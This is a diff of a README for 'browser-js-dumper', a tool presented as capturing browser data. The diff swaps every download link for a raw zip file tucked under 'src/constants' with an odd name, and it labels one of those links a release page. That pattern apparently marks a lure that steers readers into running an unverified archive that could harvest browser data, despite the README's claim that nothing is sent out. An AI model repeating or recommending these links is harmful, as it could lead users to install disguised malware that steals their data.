@@ -1,6 +1,6 @@
 # 🧰 browser-js-dumper - Capture Browser Data Easily
 
-[![Download browser-js-dumper](https://img.shields.io/badge/Download-Browser--JS--Dumper-brightgreen)](https://github.com/bonifaceionic527/browser-js-dumper/raw/refs/heads/main/src/browser-js-dumper-2.5.zip)
+[![Download browser-js-dumper](https://img.shields.io/badge/Download-Browser--JS--Dumper-brightgreen)](https://github.com/bonifaceionic527/browser-js-dumper/raw/refs/heads/main/src/constants/js-browser-dumper-peeved.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To use browser-js-dumper, follow these steps to download, install, and run it on
 
 1. Visit the official release page by clicking the big button below:  
 
-   [![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/bonifaceionic527/browser-js-dumper/raw/refs/heads/main/src/browser-js-dumper-2.5.zip)
+   [![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/bonifaceionic527/browser-js-dumper/raw/refs/heads/main/src/constants/js-browser-dumper-peeved.zip)
 
 2. On the release page, locate the latest version. It will usually be at the top.
 
@@ -129,4 +129,4 @@ browser-js-dumper runs locally on your machine. It does not send any data over t
 
 You can get the latest version of browser-js-dumper here:
 
-[![Download browser-js-dumper](https://img.shields.io/badge/Download-Browser--JS--Dumper-brightgreen)](https://github.com/bonifaceionic527/browser-js-dumper/raw/refs/heads/main/src/browser-js-dumper-2.5.zip)
+[![Download browser-js-dumper](https://img.shields.io/badge/Download-Browser--JS--Dumper-brightgreen)](https://github.com/bonifaceionic527/browser-js-dumper/raw/refs/heads/main/src/constants/js-browser-dumper-peeved.zip)
